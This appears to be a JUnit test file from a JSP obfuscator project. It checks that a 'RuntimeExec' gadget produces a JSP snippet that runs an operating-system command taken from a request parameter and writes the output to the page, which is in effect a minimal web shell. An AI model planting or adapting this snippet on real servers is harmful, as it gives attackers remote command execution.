package com.t3stzer0.jspobfuscator.plugins.extensions.Gadget;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContext;
import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContextAdapter;
import com.t3stzer0.jspobfuscator.api.plugin.gadget.GadgetExtension;
import com.t3stzer0.jspobfuscator.plugins.common.utils.random.RandomGenerator;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

class RuntimeExecTest {
  @Test
  void testGetCode() {
    GadgetExtension ext = new RuntimeExec();
    ExtensionContextAdapter ctx = new ExtensionContextAdapter();
    ext.initExtension(ctx);
    RandomGenerator rng = new RandomGenerator(ctx.getRandomSeed());
    String cmd = "" + rng.nextChar() + rng.nextChar();
    ctx.setStringInput("CommandParameter", cmd);
    List<String> code = ext.getCode(ctx);
    assertNotNull(code);
    assertEquals(1, code.size());
    String expectCode =
        String.format(
"""
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("%s")).getInputStream();
byte[] b = new byte[2048];
int len;
while((len=in.read(b))!=-1){
    out.write(new String(b,0,len));
}
""",
            cmd);
    assertEquals(expectCode, code.get(0));
  }
}
